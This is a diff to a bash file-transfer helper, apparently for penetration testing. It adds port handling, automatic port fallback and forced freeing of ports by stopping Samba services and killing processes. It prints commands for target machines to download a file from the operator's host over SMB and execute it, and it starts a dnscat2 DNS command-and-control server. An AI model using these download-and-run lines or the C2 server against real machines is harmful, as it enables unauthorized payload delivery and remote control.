@@ -15,6 +15,7 @@ NC='\033[0m' # No Color
 
 PORT=80
 HTTPS_PORT=443
+SMB_PORT=445
 WEBDAV_PORT=8080
 FTP_PORT=21
 NC_PORT=9001
@@ -28,8 +29,28 @@ while [[ $# -gt 0 ]]; do
       INTERFACE="$2"
       shift 2
       ;;
-    -p|--port)
+    -p|--port|--http-port)
       PORT="$2"
+      shift 2
+      ;;
+    --https-port)
+      HTTPS_PORT="$2"
+      shift 2
+      ;;
+    --smb-port)
+      SMB_PORT="$2"
+      shift 2
+      ;;
+    --ftp-port)
+      FTP_PORT="$2"
+      shift 2
+      ;;
+    --webdav-port)
+      WEBDAV_PORT="$2"
+      shift 2
+      ;;
+    --nc-port)
+      NC_PORT="$2"
       shift 2
       ;;
     *)
@@ -39,11 +60,115 @@ while [[ $# -gt 0 ]]; do
   esac
 done
 
+
 # Get IP address
 get_ip() {
   local iface=$1
   ip -4 addr show "$iface" 2>/dev/null | awk '/inet / {print $2}' | cut -d/ -f1
 }
+
+# Port helper functions
+is_port_in_use() {
+  local port="$1"
+  local proto="${2:-tcp}"
+
+  if command -v python3 >/dev/null 2>&1 || command -v python >/dev/null 2>&1; then
+    local py_cmd="python3"
+    command -v python3 >/dev/null 2>&1 || py_cmd="python"
+    local target_ip="${LOCAL_IP:-0.0.0.0}"
+    if ! $py_cmd -c "
+import socket, sys
+try:
+    st = socket.SOCK_DGRAM if '$proto' == 'udp' else socket.SOCK_STREAM
+    s = socket.socket(socket.AF_INET, st)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind(('0.0.0.0', $port))
+    s.close()
+    if '$target_ip' != '0.0.0.0':
+        s2 = socket.socket(socket.AF_INET, st)
+        s2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s2.bind(('$target_ip', $port))
+        s2.close()
+    sys.exit(0)
+except Exception:
+    sys.exit(1)
+" >/dev/null 2>&1; then
+      return 0
+    fi
+  fi
+
+  if command -v ss >/dev/null 2>&1; then
+    if [[ "$proto" == "tcp" ]]; then
+      ss -tlpn "sport = :$port" 2>/dev/null | grep -q LISTEN && return 0
+    else
+      ss -ulpn "sport = :$port" 2>/dev/null | grep -v '^State' | grep -q ":" && return 0
+    fi
+  fi
+  if command -v lsof >/dev/null 2>&1; then
+    lsof -i "$proto:$port" 2>/dev/null | grep -q LISTEN && return 0
+  fi
+  if command -v fuser >/dev/null 2>&1; then
+    fuser "$port/$proto" >/dev/null 2>&1 && return 0
+  fi
+  return 1
+}
+
+find_free_port() {
+  local port="$1"
+  local proto="${2:-tcp}"
+  while is_port_in_use "$port" "$proto"; do
+    ((port++))
+  done
+  echo "$port"
+}
+
+get_port_process() {
+  local port="$1"
+  local proto="${2:-tcp}"
+  local info=""
+  if command -v ss >/dev/null 2>&1; then
+    if [[ "$proto" == "tcp" ]]; then
+      info=$(ss -tlpn "sport = :$port" 2>/dev/null | grep -oP 'users:\(\("\K[^"]+' | head -n 1)
+    else
+      info=$(ss -ulpn "sport = :$port" 2>/dev/null | grep -oP 'users:\(\("\K[^"]+' | head -n 1)
+    fi
+  fi
+  if [[ -z "$info" ]] && command -v lsof >/dev/null 2>&1; then
+    info=$(lsof -i "$proto:$port" 2>/dev/null | awk 'NR>1 {print $1}' | head -n 1)
+  fi
+  if [[ -z "$info" ]] && command -v fuser >/dev/null 2>&1; then
+    info=$(fuser "$port/$proto" 2>/dev/null | tr -d ' ')
+  fi
+  echo "$info"
+}
+
+stop_conflicting_services() {
+  if [[ "$EUID" -ne 0 ]]; then
+    return
+  fi
+  case "$PROTOCOL" in
+    SMB|ALL)
+      if command -v systemctl >/dev/null 2>&1; then
+        if systemctl is-active --quiet smbd 2>/dev/null; then
+          echo -e "${YELLOW}⚠️ Stopping system 'smbd' service to free SMB port 445...${NC}"
+          systemctl stop smbd 2>/dev/null || true
+        fi
+        if systemctl is-active --quiet nmbd 2>/dev/null; then
+          echo -e "${YELLOW}⚠️ Stopping system 'nmbd' service to free NetBIOS port 139...${NC}"
+          systemctl stop nmbd 2>/dev/null || true
+        fi
+        if systemctl is-active --quiet samba-ad-dc 2>/dev/null; then
+          echo -e "${YELLOW}⚠️ Stopping system 'samba-ad-dc' service...${NC}"
+          systemctl stop samba-ad-dc 2>/dev/null || true
+        fi
+      elif command -v service >/dev/null 2>&1; then
+        service smbd stop 2>/dev/null || true
+        service nmbd stop 2>/dev/null || true
+      fi
+      ;;
+  esac
+}
+
 
 echo
 
@@ -200,36 +325,97 @@ if [[ "$PROTOCOL" == "SCP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
   echo -e "${GREEN}✅ Using SCP username: $SCP_USER${NC}\n"
 fi
 
-# Port and privilege checks
+# Pre-check & stop system services if root
+stop_conflicting_services
+
+# Try freeing ports with fuser if installed
+if command -v fuser >/dev/null 2>&1; then
+  case "$PROTOCOL" in
+    HTTP) fuser -k "$PORT/tcp" 2>/dev/null || true ;;
+    HTTPS) fuser -k "$HTTPS_PORT/tcp" 2>/dev/null || true ;;
+    SMB)  fuser -k "$SMB_PORT/tcp" 139/tcp 2>/dev/null || true ;;
+    FTP)  fuser -k "$FTP_PORT/tcp" 2>/dev/null || true ;;
+    TFTP) fuser -k 69/udp 2>/dev/null || true ;;
+    WebDAV) fuser -k "$WEBDAV_PORT/tcp" 2>/dev/null || true ;;
+    DNS)  fuser -k 53/udp 53/tcp 2>/dev/null || true ;;
+    NC)   fuser -k "$NC_PORT/tcp" 2>/dev/null || true ;;
+    ALL)
+      fuser -k "$PORT/tcp" "$HTTPS_PORT/tcp" "$SMB_PORT/tcp" 139/tcp "$FTP_PORT/tcp" 69/udp "$WEBDAV_PORT/tcp" 53/udp 53/tcp "$NC_PORT/tcp" 2>/dev/null || true
+      ;;
+  esac
+  sleep 0.3
+fi
+
+# Port and privilege checks with automatic fallback if in use
 if [[ "$PROTOCOL" == "HTTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
   if [[ "$PORT" -lt 1024 ]] && [[ "$EUID" -ne 0 ]]; then
-    echo -e "${YELLOW}⚠️ WARNING: Port $PORT is privileged and you are not root.${NC}"
+    echo -e "${YELLOW}⚠️ WARNING: Port $PORT is privileged and you are not root. Falling back to port 8000.${NC}"
     PORT=8000
-    echo -e "Falling back to port ${GREEN}$PORT${NC} for HTTP."
+  fi
+  if is_port_in_use "$PORT" tcp; then
+    old_port="$PORT"
+    PORT=$(find_free_port "$PORT" tcp)
+    echo -e "${YELLOW}⚠️ HTTP port $old_port is in use. Auto-switching to free port ${GREEN}$PORT${NC}."
   fi
 fi
 
 if [[ "$PROTOCOL" == "HTTPS" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
   if [[ "$HTTPS_PORT" -lt 1024 ]] && [[ "$EUID" -ne 0 ]]; then
-    echo -e "${YELLOW}⚠️ WARNING: Port $HTTPS_PORT is privileged and you are not root.${NC}"
+    echo -e "${YELLOW}⚠️ WARNING: Port $HTTPS_PORT is privileged and you are not root. Falling back to port 8443.${NC}"
     HTTPS_PORT=8443
-    echo -e "Falling back to port ${GREEN}$HTTPS_PORT${NC} for HTTPS."
+  fi
+  if is_port_in_use "$HTTPS_PORT" tcp; then
+    old_port="$HTTPS_PORT"
+    HTTPS_PORT=$(find_free_port "$HTTPS_PORT" tcp)
+    echo -e "${YELLOW}⚠️ HTTPS port $old_port is in use. Auto-switching to free port ${GREEN}$HTTPS_PORT${NC}."
+  fi
+fi
+
+if [[ "$PROTOCOL" == "SMB" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
+  if is_port_in_use "$SMB_PORT" tcp || is_port_in_use 139 tcp; then
+    old_port="$SMB_PORT"
+    proc="$(get_port_process "$SMB_PORT" tcp)"
+    [[ -z "$proc" ]] && proc="$(get_port_process 139 tcp)"
+    if [[ "$SMB_PORT" -eq 445 ]]; then
+      echo -e "${YELLOW}⚠️ SMB port 445/139 is in use${proc:+ by process '$proc'}.${NC}"
+      echo -e "${YELLOW}👉 Note: Windows 'net use' expects SMB on port 445 natively. Auto-switching to port 4455...${NC}"
+      SMB_PORT=$(find_free_port 4455 tcp)
+      echo -e "Using SMB port: ${GREEN}$SMB_PORT${NC}"
+    else
+      SMB_PORT=$(find_free_port "$SMB_PORT" tcp)
+      echo -e "${YELLOW}⚠️ SMB port $old_port is in use. Auto-switching to free port ${GREEN}$SMB_PORT${NC}."
+    fi
   fi
 fi
 
 if [[ "$PROTOCOL" == "FTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
-  if [[ "$FTP_PORT" -eq 21 ]] && [[ "$EUID" -ne 0 ]]; then
-    echo -e "${YELLOW}⚠️ WARNING: Port $FTP_PORT is privileged and you are not root.${NC}"
+  if [[ "$FTP_PORT" -lt 1024 ]] && [[ "$EUID" -ne 0 ]]; then
+    echo -e "${YELLOW}⚠️ WARNING: Port $FTP_PORT is privileged and you are not root. Falling back to port 2121.${NC}"
     FTP_PORT=2121
-    echo -e "Falling back to port ${GREEN}$FTP_PORT${NC} for FTP."
+  fi
+  if is_port_in_use "$FTP_PORT" tcp; then
+    old_port="$FTP_PORT"
+    FTP_PORT=$(find_free_port "$FTP_PORT" tcp)
+    echo -e "${YELLOW}⚠️ FTP port $old_port is in use. Auto-switching to free port ${GREEN}$FTP_PORT${NC}."
+  fi
+fi
+
+if [[ "$PROTOCOL" == "WebDAV" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
+  if is_port_in_use "$WEBDAV_PORT" tcp; then
+    old_port="$WEBDAV_PORT"
+    WEBDAV_PORT=$(find_free_port "$WEBDAV_PORT" tcp)
+    echo -e "${YELLOW}⚠️ WebDAV port $old_port is in use. Auto-switching to free port ${GREEN}$WEBDAV_PORT${NC}."
   fi
 fi
 
 if [[ "$PROTOCOL" == "NC" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
   if [[ "$NC_PORT" -lt 1024 ]] && [[ "$EUID" -ne 0 ]]; then
-    echo -e "${YELLOW}⚠️ WARNING: Port $NC_PORT is privileged and you are not root.${NC}"
     NC_PORT=9001
-    echo -e "Falling back to port ${GREEN}$NC_PORT${NC} for Netcat."
+  fi
+  if is_port_in_use "$NC_PORT" tcp; then
+    old_port="$NC_PORT"
+    NC_PORT=$(find_free_port "$NC_PORT" tcp)
+    echo -e "${YELLOW}⚠️ Netcat port $old_port is in use. Auto-switching to free port ${GREEN}$NC_PORT${NC}."
   fi
 fi
 
@@ -263,7 +449,11 @@ else
       fi
       if [[ "$PROTOCOL" == "SMB" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
         echo -e "  ${BLUE}Linux (SMB):${NC}"
-        echo "    smbclient \"//$LOCAL_IP/share\" -c \"get $f\" && chmod +x \"$f\" && ./\"$f\""
+        if [[ "$SMB_PORT" -eq 445 ]]; then
+          echo "    smbclient \"//$LOCAL_IP/share\" -U smbuser%smbpass -c \"get $f\" && chmod +x \"$f\" && ./\"$f\""
+        else
+          echo "    smbclient \"//$LOCAL_IP/share\" -p $SMB_PORT -U smbuser%smbpass -c \"get $f\" && chmod +x \"$f\" && ./\"$f\""
+        fi
       fi
       if [[ "$PROTOCOL" == "FTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
         echo -e "  ${BLUE}Linux (FTP):${NC}"
@@ -309,7 +499,13 @@ else
       fi
       if [[ "$PROTOCOL" == "SMB" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
         echo -e "  ${BLUE}Windows (SMB):${NC}"
-        echo "    net use \\\\$LOCAL_IP\\share /user:smbuser smbpass; cmd.exe /c \"copy \\\\$LOCAL_IP\\share\\$f . && timeout /t 2 >nul && .\\$f\""
+        if [[ "$SMB_PORT" -eq 445 ]]; then
+          echo "    net use \\\\$LOCAL_IP\\share /user:smbuser smbpass; cmd.exe /c \"copy \\\\$LOCAL_IP\\share\\$f . && timeout /t 2 >nul && .\\$f\""
+        else
+          echo -e "    ${YELLOW}⚠️ Note: Windows 'net use' requires SMB on port 445 natively. For port $SMB_PORT, use port proxy or smbclient:${NC}"
+          echo "    netsh interface portproxy add v4tov4 listenport=445 listenaddress=127.0.0.1 connectport=$SMB_PORT connectaddress=$LOCAL_IP"
+          echo "    net use \\\\127.0.0.1\\share /user:smbuser smbpass; cmd.exe /c \"copy \\\\127.0.0.1\\share\\$f . && timeout /t 2 >nul && .\\$f\""
+        fi
       fi
       if [[ "$PROTOCOL" == "FTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
         echo -e "  ${BLUE}Windows (FTP):${NC}"
@@ -351,18 +547,30 @@ echo
 
 cleanup() {
   echo -e "\n${YELLOW}🧹 Cleaning up...${NC}"
-  # Kill the entire process group started by this script
-  # This ensures all background servers and their children are killed
-  trap - EXIT # Avoid infinite loops
-  kill -TERM -$$ 2>/dev/null || true
-  sleep 0.5
-  kill -KILL -$$ 2>/dev/null || true
-  
+  trap - EXIT SIGINT SIGTERM # Avoid infinite loops
+
+  # Terminate child background processes launched by this script
+  local pids
+  pids=$(jobs -p 2>/dev/null || true)
+  if [[ -n "$pids" ]]; then
+    kill -TERM $pids 2>/dev/null || true
+    sleep 0.3
+    kill -KILL $pids 2>/dev/null || true
+  fi
+
   [[ -n "$VSFTPD_CONF" && -f "$VSFTPD_CONF" ]] && rm -f "$VSFTPD_CONF"
 }
-trap cleanup EXIT
+trap cleanup EXIT SIGINT SIGTERM
 
 start_http() {
+  if is_port_in_use "$PORT" tcp; then
+    local proc
+    proc="$(get_port_process "$PORT" tcp)"
+    echo -e "${RED}🚨 ERROR: Cannot start HTTP server: Port $PORT is already in use${proc:+ by process '$proc'}.${NC}"
+    echo -e "${YELLOW}👉 Try stopping the process using port $PORT: ${CYAN}sudo fuser -k $PORT/tcp${NC}\n"
+    return 1
+  fi
+
   if command -v goshs >/dev/null 2>&1; then
     echo -e "🟢 Starting ${CYAN}goshs${NC} HTTP server on port ${GREEN}$PORT${NC}"
     goshs -p "$PORT"
@@ -377,6 +585,14 @@ start_http() {
 }
 
 start_https() {
+  if is_port_in_use "$HTTPS_PORT" tcp; then
+    local proc
+    proc="$(get_port_process "$HTTPS_PORT" tcp)"
+    echo -e "${RED}🚨 ERROR: Cannot start HTTPS server: Port $HTTPS_PORT is already in use${proc:+ by process '$proc'}.${NC}"
+    echo -e "${YELLOW}👉 Try stopping the process using port $HTTPS_PORT: ${CYAN}sudo fuser -k $HTTPS_PORT/tcp${NC}\n"
+    return 1
+  fi
+
   if command -v goshs >/dev/null 2>&1; then
     echo -e "🟢 Starting ${CYAN}goshs${NC} HTTPS server on port ${GREEN}$HTTPS_PORT${NC} (self-signed)"
     goshs -s -ss -p "$HTTPS_PORT"
@@ -396,19 +612,45 @@ start_smb() {
     smb_cmd="/usr/bin/python3 /usr/share/doc/python3-impacket/examples/smbserver.py"
   fi
 
-  if [[ -n "$smb_cmd" ]]; then
-    echo -e "🟢 Starting ${CYAN}SMB server${NC} ($smb_cmd) (share: ${GREEN}share${NC}, user: ${GREEN}smbuser${NC}, pass: ${GREEN}smbpass${NC})"
-    $smb_cmd share "$(pwd)" -smb2support -username smbuser -password smbpass
-  else
+  if [[ -z "$smb_cmd" ]]; then
     echo -e "${RED}🚨 ERROR: 'impacket-smbserver' or 'smbserver.py' not found or not working. (pip install impacket)${NC}"
     return 1
   fi
+
+  if is_port_in_use "$SMB_PORT" tcp || is_port_in_use 139 tcp; then
+    local proc
+    proc="$(get_port_process "$SMB_PORT" tcp)"
+    [[ -z "$proc" ]] && proc="$(get_port_process 139 tcp)"
+    echo -e "${RED}🚨 ERROR: Cannot start SMB server: Port $SMB_PORT or 139 is already in use${proc:+ by process '$proc'}.${NC}"
+    if [[ "$EUID" -ne 0 ]]; then
+      echo -e "${YELLOW}👉 Try running with sudo or stopping the conflicting process:${NC}"
+      echo -e "   ${CYAN}sudo systemctl stop smbd nmbd${NC}  or  ${CYAN}sudo fuser -k 445/tcp 139/tcp${NC}\n"
+    else
+      echo -e "${YELLOW}👉 Try stopping the conflicting process:${NC}"
+      echo -e "   ${CYAN}systemctl stop smbd nmbd${NC}  or  ${CYAN}fuser -k 445/tcp 139/tcp${NC}\n"
+    fi
+    return 1
+  fi
+
+  echo -e "🟢 Starting ${CYAN}SMB server${NC} ($smb_cmd) on port ${GREEN}$SMB_PORT${NC} (share: ${GREEN}share${NC}, user: ${GREEN}smbuser${NC}, pass: ${GREEN}smbpass${NC})"
+  $smb_cmd share "$(pwd)" -smb2support -username smbuser -password smbpass -ip "$LOCAL_IP" -port "$SMB_PORT" || {
+    echo -e "${RED}🚨 ERROR: SMB server failed to start or exited unexpectedly.${NC}"
+    return 1
+  }
 }
 
 start_ftp() {
+  if is_port_in_use "$FTP_PORT" tcp; then
+    local proc
+    proc="$(get_port_process "$FTP_PORT" tcp)"
+    echo -e "${RED}🚨 ERROR: Cannot start FTP server: Port $FTP_PORT is already in use${proc:+ by process '$proc'}.${NC}"
+    echo -e "${YELLOW}👉 Try stopping the process using port $FTP_PORT: ${CYAN}sudo fuser -k $FTP_PORT/tcp${NC}\n"
+    return 1
+  fi
+
   if python3 -m pyftpdlib --help >/dev/null 2>&1; then
     echo -e "🟢 Starting ${CYAN}python3 pyftpdlib${NC} on port ${GREEN}$FTP_PORT${NC} (anonymous root: $(pwd))"
-    python3 -m pyftpdlib -p "$FTP_PORT" -d "$(pwd)" -u anonymous -P ""
+    python3 -m pyftpdlib -p "$FTP_PORT" -d "$(pwd)"
   elif command -v vsftpd >/dev/null 2>&1; then
     VSFTPD_CONF="/tmp/vsftpd.conf.$$"
     echo "listen=YES
@@ -433,6 +675,14 @@ seccomp_sandbox=NO" > "$VSFTPD_CONF"
 }
 
 start_tftp() {
+  if is_port_in_use 69 udp; then
+    local proc
+    proc="$(get_port_process 69 udp)"
+    echo -e "${RED}🚨 ERROR: Cannot start TFTP server: Port 69/udp is already in use${proc:+ by process '$proc'}.${NC}"
+    echo -e "${YELLOW}👉 Try stopping the process using port 69: ${CYAN}sudo fuser -k 69/udp${NC}\n"
+    return 1
+  fi
+
   if command -v atftpd >/dev/null 2>&1; then
     echo -e "🟢 Starting ${CYAN}atftpd${NC} on port ${GREEN}69${NC} (foreground, path: $(pwd))"
     atftpd --daemon --port 69 --no-fork "$(pwd)"
@@ -443,6 +693,14 @@ start_tftp() {
 }
 
 start_webdav() {
+  if is_port_in_use "$WEBDAV_PORT" tcp; then
+    local proc
+    proc="$(get_port_process "$WEBDAV_PORT" tcp)"
+    echo -e "${RED}🚨 ERROR: Cannot start WebDAV server: Port $WEBDAV_PORT is already in use${proc:+ by process '$proc'}.${NC}"
+    echo -e "${YELLOW}👉 Try stopping the process using port $WEBDAV_PORT: ${CYAN}sudo fuser -k $WEBDAV_PORT/tcp${NC}\n"
+    return 1
+  fi
+
   if command -v rclone >/dev/null 2>&1; then
     echo -e "🟢 Starting ${CYAN}rclone WebDAV${NC} on port ${GREEN}$WEBDAV_PORT${NC}"
     rclone serve webdav "$(pwd)" --addr ":$WEBDAV_PORT"
@@ -453,6 +711,15 @@ start_webdav() {
 }
 
 start_dns() {
+  if is_port_in_use 53 udp || is_port_in_use 53 tcp; then
+    local proc
+    proc="$(get_port_process 53 udp)"
+    [[ -z "$proc" ]] && proc="$(get_port_process 53 tcp)"
+    echo -e "${RED}🚨 ERROR: Cannot start DNS server: Port 53 is already in use${proc:+ by process '$proc'}.${NC}"
+    echo -e "${YELLOW}👉 Try stopping systemd-resolved or the process using port 53: ${CYAN}sudo systemctl stop systemd-resolved${NC} or ${CYAN}sudo fuser -k 53/udp${NC}\n"
+    return 1
+  fi
+
   if command -v dnscat2 >/dev/null 2>&1; then
     echo -e "🟢 Starting ${CYAN}dnscat2 DNS server${NC} on port ${GREEN}53${NC}"
     dnscat2 --dns server=$LOCAL_IP,port=53 --no-cache
@@ -468,6 +735,13 @@ start_nc() {
     return 1
   fi
   for f in "${SELECTED_FILES[@]}"; do
+    if is_port_in_use "$NC_PORT" tcp; then
+      local proc
+      proc="$(get_port_process "$NC_PORT" tcp)"
+      echo -e "${RED}🚨 ERROR: Cannot start Netcat: Port $NC_PORT is already in use${proc:+ by process '$proc'}.${NC}"
+      echo -e "${YELLOW}👉 Try stopping the process using port $NC_PORT: ${CYAN}sudo fuser -k $NC_PORT/tcp${NC}\n"
+      return 1
+    fi
     echo -e "🟢 Starting ${CYAN}Netcat (nc)${NC} to send ${BOLD}$f${NC} on port ${GREEN}$NC_PORT${NC}"
     echo -e "${YELLOW}ℹ️  Waiting for connection on port $NC_PORT... (Ctrl+C to skip/exit)${NC}"
     # Use -q 1 to quit 1 second after EOF (works for traditional nc)
@@ -486,20 +760,22 @@ start_scp() {
   while true; do sleep 1; done
 }
 
-# Pre-check: try to free up ports if fuser is available
+# Pre-check: try to stop conflicting system services and free up ports
+stop_conflicting_services
+
 if command -v fuser >/dev/null 2>&1; then
   echo -e "${BLUE}🛠️  Checking and cleaning target ports...${NC}"
   case "$PROTOCOL" in
     HTTP) fuser -k "$PORT/tcp" 2>/dev/null || true ;;
     HTTPS) fuser -k "$HTTPS_PORT/tcp" 2>/dev/null || true ;;
-    SMB)  fuser -k 445/tcp 2>/dev/null || true ;;
+    SMB)  fuser -k 445/tcp 139/tcp 2>/dev/null || true ;;
     FTP)  fuser -k "$FTP_PORT/tcp" 2>/dev/null || true ;;
     TFTP) fuser -k 69/udp 2>/dev/null || true ;;
     WebDAV) fuser -k "$WEBDAV_PORT/tcp" 2>/dev/null || true ;;
     DNS)  fuser -k 53/udp 53/tcp 2>/dev/null || true ;;
     NC)   fuser -k "$NC_PORT/tcp" 2>/dev/null || true ;;
     ALL)
-      fuser -k "$PORT/tcp" "$HTTPS_PORT/tcp" 445/tcp "$FTP_PORT/tcp" 69/udp "$WEBDAV_PORT/tcp" 53/udp 53/tcp "$NC_PORT/tcp" 2>/dev/null || true
+      fuser -k "$PORT/tcp" "$HTTPS_PORT/tcp" 445/tcp 139/tcp "$FTP_PORT/tcp" 69/udp "$WEBDAV_PORT/tcp" 53/udp 53/tcp "$NC_PORT/tcp" 2>/dev/null || true
       ;;
   esac
   sleep 0.5 # Give the OS a moment to release the sockets
@@ -527,3 +803,4 @@ case "$PROTOCOL" in
     start_dns || { echo -e "${YELLOW}⚠️ WARNING: Foreground DNS server (dnscat2) could not start or was exited. Waiting for background servers...${NC}"; wait; }
     ;;
 esac
+
